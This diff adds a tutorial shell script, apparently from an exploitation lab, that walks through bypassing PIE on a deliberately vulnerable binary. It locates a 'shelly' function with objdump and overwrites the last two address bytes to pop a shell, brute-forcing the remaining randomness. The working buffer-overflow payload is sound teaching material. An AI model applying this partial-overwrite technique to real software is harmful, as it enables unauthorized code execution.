@@ -1,0 +1,53 @@
+#!/bin/sh
+
+BLUE="\033[1;34m"
+NEUT="\033[0m"
+
+printf "$BLUE
+This is the same as the last (they're all the same) but we have to turn on aslr
+$NEUT 
+../../aslr.sh on"
+read
+../../aslr.sh on
+
+
+printf "$BLUE
+PIE (Position Independent Executable) randomises the addresses WITHIN the .text (code) section of our binary 
+This means we can't use the first exploit again
+But it will still be pretty easy as the bottom byte and a half of the funtion addresses remains constant
+And we hae our shelly function
+Lets find its address
+$NEUT
+objdump -d vuln | grep shelly"
+read
+objdump -d vuln | grep shelly
+
+## hack to get your addressing
+ADDR=`objdump -d vuln | grep shelly | cut -d " " -f1 | tail -c 4`
+BYTES=`python3 -c "
+from pwn import p64
+print(p64(0x$ADDR))
+"`
+
+printf "$BLUE
+The bytes '$ADDR' will remain constant
+Because of the layout in memory, we can overwrite only the last two bytes
+Meaning we have a 1 in 16 chance of getting hitting the right address!
+So it is easily brute forced.
+$NEUT
+python2 -c \"print(b'\\\x90'*120 +"
+python3 -c "print($BYTES, end='')"
+printf ")\" | ./vuln"
+read
+python2 -c "print(b'\x90'*120 + $BYTES)" | ./vuln
+
+printf "$BLUE
+Did you get it? If not, try it a few (or a lot) more times like this and you should hit it
+$NEUT
+(python2 -c \"print(b'\\\x90'*120 +"
+python3 -c "print($BYTES, end='')"
+printf ")\"; cat) | ./vuln"
+read
+(python2 -c "print(b'\x90'*120 + $BYTES)"; cat) | ./vuln
+
+
